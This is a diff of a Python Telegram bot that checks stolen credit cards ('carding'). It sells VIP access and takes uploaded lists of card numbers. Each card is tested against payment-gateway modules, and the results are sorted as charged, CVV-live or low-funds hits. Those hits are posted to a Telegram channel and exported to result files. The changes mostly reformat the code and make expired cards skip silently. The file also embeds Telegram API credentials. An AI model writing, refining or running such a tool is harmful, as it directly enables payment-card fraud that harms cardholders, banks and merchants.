@@ -14,7 +14,6 @@ API_ID = '37536372'
 API_HASH = 'abcebb0aa8c00b3ccb4a3172b566325d'
 CHANNEL_ID = '-1003763847738' 
 
-# Result Files Folder
 RESULTS_DIR = "results"
 if not os.path.exists(RESULTS_DIR):
     os.makedirs(RESULTS_DIR)
@@ -48,23 +47,27 @@ def load_users_data():
                 }}, f, indent=4)
         with open(USERS_FILE, 'r', encoding='utf-8') as f:
             return json.load(f)
-    except: return {"allowed_users": {}, "vip_plans": {}}
+    except: 
+        return {"allowed_users": {}, "vip_plans": {}}
 
 def save_users_data(data):
     try:
         with open(USERS_FILE, 'w', encoding='utf-8') as f:
             json.dump(data, f, indent=4)
-    except: pass
+    except: 
+        pass
 
 def is_user_allowed(user_id):
     users_data = load_users_data()
     user_id_str = str(user_id)
-    if user_id_str == str(ADMIN_ID): return True
+    if user_id_str == str(ADMIN_ID): 
+        return True
     if user_id_str in users_data['allowed_users']:
         user_info = users_data['allowed_users'][user_id_str]
         if 'vip_expiry' in user_info:
             expiry_date = datetime.strptime(user_info['vip_expiry'], '%Y-%m-%d %H:%M:%S')
-            if datetime.now() < expiry_date: return True
+            if datetime.now() < expiry_date: 
+                return True
     return False
 
 GATE_MODULES = []
@@ -74,40 +77,33 @@ for gate_file in glob.glob('gatet*.py'):
     try: 
         module = importlib.import_module(module_name)
         GATE_MODULES.append(module)
-    except: pass
+    except: 
+        pass
 
 bot = telebot.TeleBot(token, parse_mode="HTML")
 active_checks = {}
 
 def is_card_expired(cc):
-    """Check if card expiry date has passed"""
     try:
         parts = cc.split("|")
         if len(parts) >= 3:
             exp_month = parts[1].strip()
             exp_year_raw = parts[2].strip()
-            
-            # Convert year (26 -> 2026)
             if len(exp_year_raw) == 2:
                 exp_year = 2000 + int(exp_year_raw)
             else:
                 exp_year = int(exp_year_raw)
-            
             exp_month_int = int(exp_month)
-            
             current_date = datetime.now()
             current_year = current_date.year
             current_month = current_date.month
-            
             if exp_year < current_year:
-                return True, exp_month, exp_year_raw
+                return True
             elif exp_year == current_year and exp_month_int < current_month:
-                return True, exp_month, exp_year_raw
-            else:
-                return False, exp_month, exp_year_raw
+                return True
     except:
         pass
-    return False, None, None
+    return False
 
 @bot.message_handler(commands=["start"])
 def start(message):
@@ -151,13 +147,15 @@ def vipplans(message):
 
 @bot.message_handler(commands=["addvip"])
 def add_vip(message):
-    if str(message.chat.id) != str(ADMIN_ID): return
+    if str(message.chat.id) != str(ADMIN_ID): 
+        return
     args = message.text.split()
     if len(args) < 3:
         bot.reply_to(message, "Usage: <code>/addvip [user_id] [days]</code>")
         return
     
-    target_id = args[1]; days = int(args[2])
+    target_id = args[1]
+    days = int(args[2])
     users_data = load_users_data()
     expiry_date = datetime.now() + timedelta(days=days)
     expiry_str = expiry_date.strftime('%Y-%m-%d %H:%M:%S')
@@ -169,12 +167,15 @@ def add_vip(message):
     save_users_data(users_data)
     
     bot.reply_to(message, f"✅ User <code>{target_id}</code> added as VIP!\nExpiry: <code>{expiry_str}</code>")
-    try: bot.send_message(target_id, f"{get_emj('🎉')} <b>CONGRATS!</b>\nYour VIP status has been activated for {days} days.\nExpiry: {expiry_str}")
-    except: pass
+    try: 
+        bot.send_message(target_id, f"{get_emj('🎉')} <b>CONGRATS!</b>\nYour VIP status has been activated for {days} days.\nExpiry: {expiry_str}")
+    except: 
+        pass
 
 @bot.message_handler(commands=["broadcast"])
 def broadcast(message):
-    if str(message.chat.id) != str(ADMIN_ID): return
+    if str(message.chat.id) != str(ADMIN_ID): 
+        return
     msg_text = message.text.replace("/broadcast ", "")
     if not msg_text or msg_text == "/broadcast":
         bot.reply_to(message, "Usage: /broadcast [message]")
@@ -182,24 +183,30 @@ def broadcast(message):
     
     users_data = load_users_data()
     all_users = list(users_data['allowed_users'].keys())
-    if str(ADMIN_ID) not in all_users: all_users.append(str(ADMIN_ID))
+    if str(ADMIN_ID) not in all_users: 
+        all_users.append(str(ADMIN_ID))
     
-    success = 0; fail = 0
+    success = 0
+    fail = 0
     for user_id in all_users:
         try:
             bot.send_message(user_id, f"{get_emj('📢')} <b>ADMIN BROADCAST:</b>\n\n{msg_text}")
             success += 1
-        except: fail += 1
+        except: 
+            fail += 1
     
     bot.reply_to(message, f"✅ Broadcast sent!\nSuccess: {success}\nFailed: {fail}")
 
 def send_to_channel(cc, last, gate_name, user_name, status_type="charged"):
     if status_type == "charged":
-        emoji = get_emj('🐇'); title = "CHARGED HIT"
+        emoji = get_emj('🐇')
+        title = "CHARGED HIT"
     elif status_type == "cvv":
-        emoji = get_emj('💎'); title = "CVV LIVE"
+        emoji = get_emj('💎')
+        title = "CVV LIVE"
     else:
-        emoji = get_emj('💰'); title = "LOW FUNDS"
+        emoji = get_emj('💰')
+        title = "LOW FUNDS"
     
     channel_msg = f"""
 {title} {emoji}
@@ -209,11 +216,14 @@ Gateway ━ {gate_name}
 ━━━━━━━━━━━━━━━━━
 User ━ {user_name} (💎 PLATINUM USER)
 """
-    try: bot.send_message(CHANNEL_ID, channel_msg)
-    except: pass
+    try: 
+        bot.send_message(CHANNEL_ID, channel_msg)
+    except: 
+        pass
 
 def update_ui(message, stats):
-    if stats.get('stop_event', False): return
+    if stats.get('stop_event', False): 
+        return
     markup = types.InlineKeyboardMarkup(row_width=2)
     markup.add(
         types.InlineKeyboardButton(f"✅ CHARGED: {stats['ch']}", callback_data='n'),
@@ -224,7 +234,9 @@ def update_ui(message, stats):
         types.InlineKeyboardButton(f"📊 PROGRESS: {stats['checked']}/{stats['total']}", callback_data='n'),
         types.InlineKeyboardButton(f"🛑 STOP", callback_data='stop')
     )
-    last_cc = stats.get('last_cc', 'N/A'); last_gate = stats.get('last_gate', 'N/A'); last_resp = stats.get('last_resp', 'Waiting...')
+    last_cc = stats.get('last_cc', 'N/A')
+    last_gate = stats.get('last_gate', 'N/A')
+    last_resp = stats.get('last_resp', 'Waiting...')
     text = f"""
 {get_emj('🔄')} <b>FAST CHECKING IN PROGRESS...</b>
 <b>━━━━━━━━━━━━━━</b>
@@ -234,14 +246,15 @@ def update_ui(message, stats):
 <b>━━━━━━━━━━━━━━</b>
 <b>BY: @Mydev1</b>
 """
-    try: bot.edit_message_text(chat_id=message.chat.id, message_id=stats['msg_id'], text=text, reply_markup=markup)
-    except: pass
+    try: 
+        bot.edit_message_text(chat_id=message.chat.id, message_id=stats['msg_id'], text=text, reply_markup=markup)
+    except: 
+        pass
 
 def save_result_to_file(cc, status_type, bank, country, gate_name):
     try:
         file_path_hit = os.path.join(RESULTS_DIR, "hit.txt")
         file_path_low = os.path.join(RESULTS_DIR, "low.txt")
-        
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         line = f"{cc}|{bank}|{country}|{gate_name}|{timestamp}\n"
         
@@ -254,7 +267,7 @@ def save_result_to_file(cc, status_type, bank, country, gate_name):
     except Exception as e:
         print(f"File save error: {e}")
 
-def send_result_files(message, chat_id):
+def send_result_files(chat_id):
     hit_path = os.path.join(RESULTS_DIR, "hit.txt")
     low_path = os.path.join(RESULTS_DIR, "low.txt")
     
@@ -263,48 +276,28 @@ def send_result_files(message, chat_id):
             with open(hit_path, 'rb') as f:
                 bot.send_document(chat_id, f, caption=f"{get_emj('🔥')} <b>HIT RESULTS</b>")
             open(hit_path, 'w').close()
-        else:
-            bot.send_message(chat_id, f"{get_emj('❌')} No HIT results found.")
         
         if os.path.exists(low_path) and os.path.getsize(low_path) > 0:
             with open(low_path, 'rb') as f:
                 bot.send_document(chat_id, f, caption=f"{get_emj('💰')} <b>LOW FUND RESULTS</b>")
             open(low_path, 'w').close()
-        else:
-            bot.send_message(chat_id, f"{get_emj('❌')} No LOW FUND results found.")
     except Exception as e:
         print(f"Send file error: {e}")
 
 def process_cc(cc, message, stats):
-    if stats.get('stop_event', False): return
+    if stats.get('stop_event', False): 
+        return
     cc = cc.strip()
-    if not cc: return
-    stats['last_cc'] = cc
-    
-    # ========== CHECK EXPIRY DATE FIRST ==========
-    is_expired, exp_month, exp_year = is_card_expired(cc)
-    
-    if is_expired:
-        stats['dd'] += 1
-        stats['checked'] += 1
-        stats['last_resp'] = f"📅 CARD EXPIRED ({exp_month}/{exp_year})"
-        stats['last_gate'] = "N/A"
-        
-        expired_msg = f"""
-{get_emj('📅')} <b>EXPIRED CARD!</b> {get_emj('❌')}
-<b>━━━━━━━━━━━━━━</b>
-{get_emj('💳')} <b>CARD:</b> <code>{cc}</code>
-{get_emj('📝')} <b>STATUS:</b> <code>Card Expired ({exp_month}/{exp_year})</code>
-<b>━━━━━━━━━━━━━━</b>
-<b>BY: @Mydev1</b>
-"""
-        bot.reply_to(message, expired_msg)
-        
-        if stats['checked'] % 5 == 0 or stats['checked'] == stats['total']:
-            update_ui(message, stats)
+    if not cc: 
         return
     
-    # ========== CONTINUE WITH GATEWAY CHECK ==========
+    # ----- EXPIRED CHECK - NO MESSAGE, NO COUNT (silent skip) -----
+    if is_card_expired(cc):
+        stats['checked'] += 1   # to keep progress moving
+        return
+    
+    stats['last_cc'] = cc
+    
     try: 
         data = requests.get('https://bins.antipublic.cc/bins/'+cc[:6], timeout=5).json()
     except: 
@@ -323,54 +316,37 @@ def process_cc(cc, message, stats):
         stats['last_gate'] = gate_name
         try:
             last_raw = str(random_gate.Tele(cc))
-            
-            # Try to extract meaningful message
             if '"message":' in last_raw:
-                try:
-                    response_json = json.loads(last_raw)
-                    if 'error' in response_json and 'message' in response_json['error']:
-                        last = response_json['error']['message']
-                    elif 'message' in response_json:
-                        last = response_json['message']
-                    else:
-                        last = last_raw
-                except:
+                try: 
+                    last = json.loads(last_raw)['error'].get('message', last_raw)
+                except: 
                     last = last_raw
-            else:
+            else: 
                 last = last_raw if last_raw != "0" else "Site Rejected"
-        except Exception as e:
-            last = f"Gateway Error: {str(e)[:50]}"
+        except: 
+            last = "Gateway Error"
     
     stats['last_resp'] = last
     execution_time = time.time() - start_time
     last_lower = last.lower()
     
-    # ========== RESPONSE CLASSIFICATION ==========
     is_hit = False
     is_low = False
     is_3ds = False
     
-    # Keywords for different responses
-    hit_keywords = ['approved', 'thank', 'successful', 'confirmed', 'paid', 'charge', 'captured', 'success":true']
-    low_keywords = ['insufficient funds', 'low funds', 'balance', 'insufficient']
-    three_keywords = ['3d_secure', 'authenticate', 'verification required', 'challenge_required', 'action required', 'additional action']
-    expired_keywords = ['expired', 'expiry']
+    hit_k = ['thank', 'success":true', 'thank-you', 'successful', 'Successful!', 'confirmed', 'paid', 'transaction_id']
+    low_k = ['insufficient funds', 'low funds', 'money', 'balance']
+    three_k = ['additional action', 'authenticate', '3d_secure', 'verification required', 'challenge_required', 'initstripescamodal', 'client_secret', 'strong customer authentication']
     
-    # Check for expired from gateway response
-    if any(k in last_lower for k in expired_keywords):
-        last = f"📅 EXPIRED CARD"
-        stats['dd'] += 1
-    elif any(k in last_lower for k in three_keywords):
+    if any(k in last_lower for k in three_k): 
         is_3ds = True
         last = "3D Authentication Required"
-    elif any(k in last_lower for k in hit_keywords) and 'error' not in last_lower and '"success":false' not in last_lower:
+    elif any(k in last_lower for k in hit_k) and '"success":false' not in last_lower and 'error' not in last_lower: 
         is_hit = True
-        last = "Transaction Successful"
-    elif any(k in last_lower for k in low_keywords):
+        last = "Transaction Successful" if "success" in last_lower else last
+    elif any(k in last_lower for k in low_k): 
         is_low = True
         last = "Insufficient Funds"
-    else:
-        stats['dd'] += 1
     
     user_fname = message.from_user.first_name
     user_uname = f"@{message.from_user.username}" if message.from_user.username else "No Username"
@@ -388,56 +364,81 @@ def process_cc(cc, message, stats):
 <b>━━━━━━━━━━━━━━</b>
 <b>BY: @Mydev1</b>
 """
-    
-    if is_hit:
+    if is_hit: 
         stats['ch'] += 1
         bot.reply_to(message, hit_msg)
         send_to_channel(cc, last, gate_name, user_display, "charged")
         save_result_to_file(cc, "hit", bank, country, gate_name)
-    elif is_low:
+    elif is_low: 
         stats['low'] += 1
         bot.reply_to(message, hit_msg.replace("HIT FOUND", "LOW FUNDS").replace(get_emj('🔥'), get_emj('💰')))
         send_to_channel(cc, last, gate_name, user_display, "low")
         save_result_to_file(cc, "low", bank, country, gate_name)
-    elif is_3ds:
+    elif is_3ds: 
         stats['cvv'] += 1
         bot.reply_to(message, hit_msg.replace("HIT FOUND", "CVV LIVE").replace(get_emj('🔥'), get_emj('💎')))
         send_to_channel(cc, last, gate_name, user_display, "cvv")
-    elif 'security code is incorrect' in last_lower or 'cvc_check_failure' in last_lower:
+    elif 'security code is incorrect' in last_lower or 'cvc_check_failure' in last_lower: 
         stats['ccn'] += 1
-    elif 'Your card does not support this type of purchase' in last_lower or 'transaction_not_allowed' in last_lower:
+    elif 'Your card does not support this type of purchase' in last_lower or 'transaction_not_allowed' in last_lower: 
         stats['cvv'] += 1
+    else: 
+        stats['dd'] += 1
     
     stats['checked'] += 1
-    if stats['checked'] % 5 == 0 or stats['checked'] == stats['total']:
+    if stats['checked'] % 5 == 0 or stats['checked'] == stats['total']: 
         update_ui(message, stats)
 
 @bot.message_handler(content_types=["document"])
 def handle_docs(message):
     if not is_user_allowed(message.chat.id):
-        bot.reply_to(message, f"{get_emj('❌')} Buy VIP first!"); return
+        bot.reply_to(message, f"{get_emj('❌')} Buy VIP first!")
+        return
+    
     ko = bot.reply_to(message, f"{get_emj('⏳')} <b>STARTING FAST CHECKER...</b>").message_id
-    file_info = bot.get_file(message.document.file_id); downloaded = bot.download_file(file_info.file_path)
+    file_info = bot.get_file(message.document.file_id)
+    downloaded = bot.download_file(file_info.file_path)
     path = f"combo_{message.document.file_id}.txt"
-    with open(path, "wb") as f: f.write(downloaded)
-    with open(path, 'r', encoding='utf-8') as f: lino = [l.strip() for l in f.readlines() if l.strip()]
-    stats = {'ch': 0, 'ccn': 0, 'cvv': 0, 'low': 0, 'dd': 0, 'checked': 0, 'total': len(lino), 'msg_id': ko, 'stop_event': False, 'last_cc': 'N/A', 'last_gate': 'N/A', 'last_resp': 'Waiting...'}
+    with open(path, "wb") as f: 
+        f.write(downloaded)
+    with open(path, 'r', encoding='utf-8') as f: 
+        lino = [l.strip() for l in f.readlines() if l.strip()]
+    
+    stats = {
+        'ch': 0, 'ccn': 0, 'cvv': 0, 'low': 0, 'dd': 0,
+        'checked': 0, 'total': len(lino), 'msg_id': ko,
+        'stop_event': False, 'last_cc': 'N/A', 'last_gate': 'N/A', 'last_resp': 'Waiting...'
+    }
     active_checks[message.chat.id] = stats
     update_ui(message, stats)
+    
     with ThreadPoolExecutor(max_workers=5) as executor:
         for cc in lino:
-            if stats['stop_event']: break
+            if stats['stop_event']: 
+                break
             executor.submit(process_cc, cc, message, stats)
             time.sleep(0.05)
+    
     active_checks.pop(message.chat.id, None)
+    
     final_text = f"{get_emj('🛑')} <b>STOPPED BY USER</b>" if stats['stop_event'] else f"{get_emj('✅')} <b>FAST CHECKING COMPLETED!</b>"
     final_markup = types.InlineKeyboardMarkup()
-    final_markup.add(types.InlineKeyboardButton(f"✅ {stats['ch']}", callback_data='n'), types.InlineKeyboardButton(f"💳 {stats['ccn']}", callback_data='n'), types.InlineKeyboardButton(f"💎 {stats['cvv']}", callback_data='n'), types.InlineKeyboardButton(f"💰 {stats['low']}", callback_data='n'), types.InlineKeyboardButton(f"❌ {stats['dd']}", callback_data='n'))
-    try: bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=final_text, reply_markup=final_markup)
-    except: pass
-    if os.path.exists(path): os.remove(path)
+    final_markup.add(
+        types.InlineKeyboardButton(f"✅ {stats['ch']}", callback_data='n'),
+        types.InlineKeyboardButton(f"💳 {stats['ccn']}", callback_data='n'),
+        types.InlineKeyboardButton(f"💎 {stats['cvv']}", callback_data='n'),
+        types.InlineKeyboardButton(f"💰 {stats['low']}", callback_data='n'),
+        types.InlineKeyboardButton(f"❌ {stats['dd']}", callback_data='n')
+    )
+    try: 
+        bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=final_text, reply_markup=final_markup)
+    except: 
+        pass
     
-    send_result_files(message, message.chat.id)
+    if os.path.exists(path): 
+        os.remove(path)
+    
+    send_result_files(message.chat.id)
 
 @bot.callback_query_handler(func=lambda call: call.data == 'stop')
 def stop_cb(call):
@@ -445,9 +446,10 @@ def stop_cb(call):
     if user_id in active_checks:
         active_checks[user_id]['stop_event'] = True
         bot.answer_callback_query(call.id, "🛑 Stopping immediately...")
-    else: bot.answer_callback_query(call.id, "❌ No active session.")
+    else: 
+        bot.answer_callback_query(call.id, "❌ No active session.")
 
 if __name__ == "__main__":
     bot.delete_webhook()
-    print("Fast Bot is running with EXPIRY DETECTION & HIT/LOW File Export...")
+    print("Fast Bot is running - EXPIRED cards are SILENTLY SKIPPED (no message, no count)")
     bot.infinity_polling()
